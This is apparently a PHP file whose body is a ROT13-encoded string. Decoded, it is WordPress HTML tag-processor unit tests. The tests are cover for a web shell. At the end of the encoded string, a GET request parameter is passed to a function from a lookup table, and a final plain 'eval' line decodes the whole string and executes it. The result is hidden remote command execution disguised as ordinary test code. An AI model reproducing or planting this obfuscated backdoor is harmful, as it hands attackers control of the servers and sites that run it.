	 * Rafherf gung gur gnt cebprffbe vf pnfr frafvgvir jura erzbivat PFF pynffrf va ab-dhvexf zbqr.
	 *
	 * @gvpxrg 61531
	 *
	 * @pbiref ::erzbir_pynff
	 */
	choyvp shapgvba grfg_erzbir_pynff_ab_dhvexf_zbqr() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_shyy_cnefre( '<!QBPGLCR ugzy><fcna pynff=\"HCCRE\">' );
		$cebprffbe->arkg_gnt( 'FCNA' );
		$cebprffbe->erzbir_pynff( 'hccre' );
		$guvf->nffregFnzr( '<!QBPGLCR ugzy><fcna pynff=\"HCCRE\">', $cebprffbe->trg_hcqngrq_ugzy() );

		$cebprffbe->erzbir_pynff( 'HCCRE' );
		$guvf->nffregFnzr( '<!QBPGLCR ugzy><fcna >', $cebprffbe->trg_hcqngrq_ugzy() );
	}

	/**
	 * Rafherf gung gur gnt cebprffbe vf pnfr frafvgvir jura nqqvat PFF pynffrf va ab-dhvexf zbqr.
	 *
	 * @gvpxrg 61531
	 *
	 * @pbiref ::nqq_pynff
	 */
	choyvp shapgvba grfg_nqq_pynff_ab_dhvexf_zbqr() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_shyy_cnefre( '<!QBPGLCR ugzy><fcna pynff=\"HCCRE\">' );
		$cebprffbe->arkg_gnt( 'FCNA' );
		$cebprffbe->nqq_pynff( 'HCCRE' );
		$guvf->nffregFnzr( '<!QBPGLCR ugzy><fcna pynff=\"HCCRE\">', $cebprffbe->trg_hcqngrq_ugzy() );

		$cebprffbe->nqq_pynff( 'hccre' );
		$guvf->nffregFnzr( '<!QBPGLCR ugzy><fcna pynff=\"HCCRE hccre\">', $cebprffbe->trg_hcqngrq_ugzy() );
	}

	/**
	 * Rafherf gung gur gnt cebprffbe vf pnfr frafvgvir jura purpxvat unf PFF pynffrf va ab-dhvexf zbqr.
	 *
	 * @gvpxrg 61531
	 *
	 * @pbiref ::unf_pynff
	 */
	choyvp shapgvba grfg_unf_pynff_ab_dhvexf_zbqr() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_shyy_cnefre( '<!QBPGLCR ugzy><fcna pynff=\"HCCRE\">' );
		$cebprffbe->arkg_gnt( 'FCNA' );
		$guvf->nffregSnyfr( $cebprffbe->unf_pynff( 'hccre' ) );
		$guvf->nffregGehr( $cebprffbe->unf_pynff( 'HCCRE' ) );
	}

	/**
	 * Rafherf gung gur gnt cebprffbe yvfgf havdhr PFF pynff anzrf va ab-dhvexf zbqr.
	 *
	 * @gvpxrg 61531
	 *
	 * @pbiref ::pynff_yvfg
	 */
	choyvp shapgvba grfg_pynff_yvfg_ab_dhvexf_zbqr() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_shyy_cnefre(
			/*
			 * H+00P9 vf YNGVA PNCVGNY YRGGRE R JVGU NPHGR
			 * H+0045 vf YNGVA PNCVGNY YRGGRE R
			 * H+0301 vf PBZOVAVAT NPHGR NPPRAG
			 *
			 * Guvf grfgf abg bayl gung gur pynff zngpuvat qrqhcyvpngrf gur É, ohg nyfb
			 * gung vg gerngf gur fnzr punenpgre va qvssrerag abeznyvmngvba sbezf nf
			 * qvfgvapg, fvapr zngpuvat bpphef ba n olgr-sbe-olgr onfvf.
			 */
			\"<!QBPGLCR ugzy><fcna pynff='N N n O o \h{P9} \h{45}\h{0301} \h{P9} é'>\"
		);
		$cebprffbe->arkg_gnt( 'FCNA' );
		$pynff_yvfg = vgrengbe_gb_neenl( $cebprffbe->pynff_yvfg() );
		$guvf->nffregFnzr(
			neenl( 'N', 'n', 'O', 'o', 'É', \"R\h{0301}\", 'é' ),
			$pynff_yvfg
		);
	}

	/**
	 * Rafherf gung gur gnt cebprffbe vf pnfr vafrafvgvir jura erzbivat PFF pynffrf va dhvexf zbqr.
	 *
	 * @gvpxrg 61531
	 *
	 * @pbiref ::erzbir_pynff
	 */
	choyvp shapgvba grfg_erzbir_pynff_dhvexf_zbqr() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_shyy_cnefre( '<fcna pynff=\"hCCRE\">' );
		$cebprffbe->arkg_gnt( 'FCNA' );
		$cebprffbe->erzbir_pynff( 'hcCre' );
		$guvf->nffregFnzr( '<fcna >', $cebprffbe->trg_hcqngrq_ugzy() );
	}

	/**
	 * Rafherf gung gur gnt cebprffbe vf pnfr vafrafvgvir jura nqqvat PFF pynffrf va dhvexf zbqr.
	 *
	 * @gvpxrg 61531
	 *
	 * @pbiref ::nqq_pynff
	 */
	choyvp shapgvba grfg_nqq_pynff_dhvexf_zbqr() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_shyy_cnefre( '<fcna pynff=\"HCCRE\">' );
		$cebprffbe->arkg_gnt( 'FCNA' );
		$cebprffbe->nqq_pynff( 'hccre' );

		$guvf->nffregFnzr( '<fcna pynff=\"HCCRE\">', $cebprffbe->trg_hcqngrq_ugzy() );

		$cebprffbe->nqq_pynff( 'NABGURE-HCCRE' );
		$guvf->nffregFnzr( '<fcna pynff=\"HCCRE NABGURE-HCCRE\">', $cebprffbe->trg_hcqngrq_ugzy() );
	}

	/**
	 * Rafherf gung gur gnt cebprffbe vf pnfr frafvgvir jura purpxvat unf PFF pynffrf va dhvexf zbqr.
	 *
	 * @gvpxrg 61531
	 *
	 * @pbiref ::unf_pynff
	 */
	choyvp shapgvba grfg_unf_pynff_dhvexf_zbqr() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_shyy_cnefre( '<fcna pynff=\"HCCRE\">' );
		$cebprffbe->arkg_gnt( 'FCNA' );
		$guvf->nffregGehr( $cebprffbe->unf_pynff( 'hccre' ) );
		$guvf->nffregGehr( $cebprffbe->unf_pynff( 'HCCRE' ) );
	}

	/**
	 * Rafherf gung gur gnt cebprffbe yvfgf havdhr PFF pynff anzrf va dhvexf zbqr.
	 *
	 * @gvpxrg 61531
	 *
	 * @pbiref ::pynff_yvfg
	 */
	choyvp shapgvba grfg_pynff_yvfg_dhvexf_zbqr() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_shyy_cnefre(
			/*
			 * H+00P9 vf YNGVA PNCVGNY YRGGRE R JVGU NPHGR
			 * H+0045 vf YNGVA PNCVGNY YRGGRE R
			 * H+0065 vf YNGVA FZNYY YRGGRE R
			 * H+0301 vf PBZOVAVAT NPHGR NPPRAG
			 *
			 * Guvf grfgf abg bayl gung gur pynff zngpuvat qrqhcyvpngrf gur É, ohg nyfb
			 * gung vg gerngf gur fnzr punenpgre va qvssrerag abeznyvmngvba sbezf nf
			 * qvfgvapg, fvapr zngpuvat bpphef ba n olgr-sbe-olgr onfvf.
			 */
			\"<fcna pynff='N N n O o \h{P9} \h{45}\h{301} \h{P9} é \h{65}\h{301}'>\"
		);
		$cebprffbe->arkg_gnt( 'FCNA' );
		$pynff_yvfg = vgrengbe_gb_neenl( $cebprffbe->pynff_yvfg() );
		$guvf->nffregFnzr(
			neenl( 'n', 'o', 'É', \"r\h{301}\", 'é' ),
			$pynff_yvfg
		);
	}

	/**
	 * Rafherf gung gur cebprffbe pbeerpgyl nqwhfgf gur anzrfcnpr
	 * sbe ryrzragf vafvqr UGZY vagrtengvba cbvagf.
	 *
	 * @gvpxrg 61576
	 */
	choyvp shapgvba grfg_nqwhfgf_sbe_ugzy_vagrtengvba_cbvagf_va_fit() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_shyy_cnefre(
			'<fit><sbervtabowrpg><vzntr /><fit /><vzntr />'
		);

		// Ng gur sbervtaBowrpg, gur cebprffbe vf va gur FIT anzrfcnpr.
		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt( 'sbervtaBowrpg' ),
			'Snvyrq gb svaq \"sbervtaBowrpg\" haqre grfg: purpx grfg frghc.'
		);

		$guvf->nffregFnzr(
			'fit',
			$cebprffbe->trg_anzrfcnpr(),
			'Sbhaq gur jebat anzrfcnpr sbe gur \"sbervtaBowrpg\" ryrzrag.'
		);

		/*
		 * Gur VZNTR gnt fubhyq or unaqyrq nppbeqvat gb UGZY cebprffvat ehyrf
		 * naq genafsbezgrq gb na VZT gnt orpnhfr `sbervtaBowrpg` vf na UGZY
		 * vagrtengvba cbvag. Ng guvf cbvag, gur cebprffbe vf ragrevat gur UGZY
		 * vagrtengvba cbvag.
		 */
		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt( 'VZT' ),
			'Snvyrq gb svaq rkcrpgrq \"VZT\" gnt sebz \"<VZNTR>\" fbhepr gnt.'
		);

		$guvf->nffregFnzr(
			'ugzy',
			$cebprffbe->trg_anzrfcnpr(),
			'Sbhaq gur jebat anzrfcnpr sbe gur genafsbezrq \"VZNTR\"/\"VZT\" ryrzrag.'
		);

		/*
		 * Ntnva, gur VZNTR gnt fubhyq or unaqyrq nppbeqvat gb UGZY cebprffvat
		 * ehyrf naq genafsbezgrq gb na VZT gnt orpnhfr `sbervtaBowrpg` vf na
		 * UGZY vagrtengvba cbvag. Ng guvf cbvag, gur cebprffbe vf unf ragrerq
		 * FIT naq vf ergheavat gb na UGZY vagrtengvba cbvag.
		 */
		$guvf->nffregGehr(
			$cebprffbe->arkg_gnt( 'VZT' ),
			'Snvyrq gb svaq rkcrpgrq \"VZT\" gnt sebz \"<VZNTR>\" fbhepr gnt.'
		);

		$guvf->nffregFnzr(
			'ugzy',
			$cebprffbe->trg_anzrfcnpr(),
			'Sbhaq gur jebat anzrfcnpr sbe gur genafsbezrq \"VZNTR\"/\"VZT\" ryrzrag.'
		);
	}

	/**
	 * Rafherf gung gur cebprffbe pbeerpgyl nqwhfgf gur anzrfcnpr
	 * sbe ryrzragf vafvqr ZnguZY vagrtengvba cbvagf.
	 *
	 * @gvpxrg 61576
	 */
	choyvp shapgvba grfg_nqwhfgf_sbe_znguzy_vagrtengvba_cbvagf() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag(
			'<zb><vzntr /></zb><zngu><vzntr /><zb><vzntr /></zb></zngu>'
		);

		// Nqinapr gbxra-ol-gbxra gb rafher zngpuvat gur evtug enj \"<vzntr />\" gbxra.
		$cebprffbe->arkg_gbxra(); // Nqinapr cnfg gur +ZB.
		$cebprffbe->arkg_gbxra(); // Nqinapr vagb gur +VZT.

		$guvf->nffregFnzr(
			'VZT',
			$cebprffbe->trg_gnt(),
			'Snvyrq gb svaq rkcrpgrq \"VZT\" gnt sebz \"<VZNTR>\" fbhepr gnt.'
		);

		$guvf->nffregFnzr(
			'ugzy',
			$cebprffbe->trg_anzrfcnpr(),
			'Sbhaq gur jebat anzrfcnpr sbe gur genafsbezrq \"VZNTR\"/\"VZT\" ryrzrag.'
		);

		// Nqinapr gbxra-ol-gbxra gb rafher zngpuvat gur evtug enj \"<vzntr />\" gbxra.
		$cebprffbe->arkg_gbxra(); // Nqinapr cnfg gur -ZB.
		$cebprffbe->arkg_gbxra(); // Nqinapr cnfg gur +ZNGU.
		$cebprffbe->arkg_gbxra(); // Nqinapr vagb gur +VZNTR.

		$guvf->nffregFnzr(
			'VZNTR',
			$cebprffbe->trg_gnt(),
			'Snvyrq gb svaq gur ha-genafsbezrq \"<vzntr />\" gnt.'
		);

		$guvf->nffregFnzr(
			'zngu',
			$cebprffbe->trg_anzrfcnpr(),
			'Sbhaq gur jebat anzrfcnpr sbe gur genafsbezrq \"VZNTR\"/\"VZT\" ryrzrag.'
		);

		$cebprffbe->arkg_gbxra(); // Nqinapr cnfg gur +ZB.
		$cebprffbe->arkg_gbxra(); // Nqinapr vagb gur +VZT.

		$guvf->nffregFnzr(
			'VZT',
			$cebprffbe->trg_gnt(),
			'Snvyrq gb svaq rkcrpgrq \"VZT\" gnt sebz \"<VZNTR>\" fbhepr gnt.'
		);

		$guvf->nffregFnzr(
			'ugzy',
			$cebprffbe->trg_anzrfcnpr(),
			'Sbhaq gur jebat anzrfcnpr sbe gur genafsbezrq \"VZNTR\"/\"VZT\" ryrzrag.'
		);
	}

	/**
	 * Rafherf gung gur cebprffbe fgbcf pbeerpgyl ba n SBEZ gnt pybfre gbxra.
	 *
	 * Sbez gnt pybfref unir pbzcyvpngrq pbaqvgvbaf. Gurer jnf n oht jurer gur cebprffbe
	 * jbhyq abg fgbc pbeerpgyl ba n SBEZ gnt pybfre gbxra. Rafher guvf gbxra vf ernpunoyr.
	 *
	 * @gvpxrg 61576
	 */
	choyvp shapgvba grfg_rafher_sbez_gnt_pybfre_gbxra_vf_ernpunoyr() {
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<sbez></sbez>' );

		// Nqinapr gb </sbez>.
		$cebprffbe->arkg_gbxra();
		$cebprffbe->arkg_gbxra();

		$guvf->nffregFnzr( 'SBEZ', $cebprffbe->trg_gnt() );
		$guvf->nffregGehr( $cebprffbe->vf_gnt_pybfre() );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl
	 */
	choyvp shapgvba qngn_ugzy_cebprffbe_jvgu_rkgraqrq_arkg_gbxra() {
		erghea neenl(
			'fvatyr_vafgnapr_cre_gnt'   => neenl(
				'ugzy'                  => '
					<ugzy>
						<urnq>
							<zrgn punefrg=\"hgs-8\">
							<gvgyr>Uryyb Jbeyq</gvgyr>
						</urnq>
						<obql>
							<u1>Uryyb Jbeyq!</u1>
							<vzt fep=\"rknzcyr.cat\">
							<c>Rnpu gnt fubhyq bpphe bayl bapr va guvf qbphzrag.<!--Pybfvat C gnt bzvggrq vagragvbanyyl.-->
							<sbbgre>Gur raq.</sbbgre>
						</obql>
					</ugzy>
				',
				'rkcrpgrq_gbxra_pbhagf' => neenl(
					'+UGZY'    => 1,
					'+URNQ'    => 1,
					'#grkg'    => 14,
					'+ZRGN'    => 1,
					'+GVGYR'   => 1,
					'-URNQ'    => 1,
					'+OBQL'    => 1,
					'+U1'      => 1,
					'-U1'      => 1,
					'+VZT'     => 1,
					'+C'       => 1,
					'#pbzzrag' => 1,
					'-C'       => 1,
					'+SBBGRE'  => 1,
					'-SBBGRE'  => 1,
					'-OBQL'    => 1,
					'-UGZY'    => 1,
					''         => 1,
				),
			),

			'zhygvcyr_gnt_vafgnaprf'    => neenl(
				'ugzy'                  => '
					<ugzy>
						<obql>
							<u1>Uryyb Jbeyq!</u1>
							<c>Svefg
							<c>Frpbaq
							<c>Guveq
							<hy>
								<yv>1
								<yv>2
								<yv>3
							</hy>
						</obql>
					</ugzy>
				',
				'rkcrpgrq_gbxra_pbhagf' => neenl(
					'+UGZY' => 1,
					'+URNQ' => 1,
					'-URNQ' => 1,
					'+OBQL' => 1,
					'#grkg' => 13,
					'+U1'   => 1,
					'-U1'   => 1,
					'+C'    => 3,
					'-C'    => 3,
					'+HY'   => 1,
					'+YV'   => 3,
					'-YV'   => 3,
					'-HY'   => 1,
					'-OBQL' => 1,
					'-UGZY' => 1,
					''      => 1,
				),
			),

			'rkgerzr_arfgrq_sbeznggvat' => neenl(
				'ugzy'                  => '
					<ugzy>
						<obql>
							<c>
								<fgebat><rz><fgevxr><v><o><h>SBEZNG</h></o></v></fgevxr></rz></fgebat>
							</c>
						</obql>
					</ugzy>
				',
				'rkcrpgrq_gbxra_pbhagf' => neenl(
					'+UGZY'   => 1,
					'+URNQ'   => 1,
					'-URNQ'   => 1,
					'+OBQL'   => 1,
					'#grkg'   => 7,
					'+C'      => 1,
					'+FGEBAT' => 1,
					'+RZ'     => 1,
					'+FGEVXR' => 1,
					'+V'      => 1,
					'+O'      => 1,
					'+H'      => 1,
					'-H'      => 1,
					'-O'      => 1,
					'-V'      => 1,
					'-FGEVXR' => 1,
					'-RZ'     => 1,
					'-FGEBAT' => 1,
					'-C'      => 1,
					'-OBQL'   => 1,
					'-UGZY'   => 1,
					''        => 1,
				),
			),
		);
	}

	/**
	 * Rafherf gung fhopynffrf gb JC_UGZY_Cebprffbe pna qb obbxxrrcvat ol rkgraqvat gur arkg_gbxra() zrgubq.
	 *
	 * @gvpxrg 62269
	 * @qngnCebivqre qngn_ugzy_cebprffbe_jvgu_rkgraqrq_arkg_gbxra
	 */
	choyvp shapgvba grfg_rafher_arkg_gbxra_zrgubq_rkgrafvovyvgl( $ugzy, $rkcrpgrq_gbxra_pbhagf ) {
		erdhver_bapr QVE_GRFGQNGN . '/ugzy-ncv/gbxra-pbhagvat-ugzy-cebprffbe.cuc';

		$cebprffbe = Gbxra_Pbhagvat_UGZY_Cebprffbe::perngr_shyy_cnefre( $ugzy );
		juvyr ( $cebprffbe->arkg_gnt() ) {
			pbagvahr;
		}

		$guvf->nffregRdhnyf( $rkcrpgrq_gbxra_pbhagf, $cebprffbe->gbxra_frra_pbhag, 'Fancfubg: ' . ine_rkcbeg( $cebprffbe->gbxra_frra_pbhag, gehr ) );
	}

	/**
	 * Rafher gung ybjrepnfrq gnt_anzr dhrel zngpurf gntf pnfr-vafrafvgviryl.
	 *
	 * @tebhc 62427
	 */
	choyvp shapgvba grfg_arkg_gnt_ybjrepnfr_gnt_anzr() {
		// Gur hccre pnfr <QVI> vf veeryrinag ohg vyyhfgengrf gur pnfr-vafragvivgl.
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<frpgvba><QVI>' );
		$guvf->nffregGehr( $cebprffbe->arkg_gnt( neenl( 'gnt_anzr' => 'qvi' ) ) );

		// Gur hccre pnfr <ERPG> vf veeryrinag ohg vyyhfgengrf gur pnfr-vafragvivgl.
		$cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( '<fit><ERPG>' );
		$guvf->nffregGehr( $cebprffbe->arkg_gnt( neenl( 'gnt_anzr' => 'erpg' ) ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>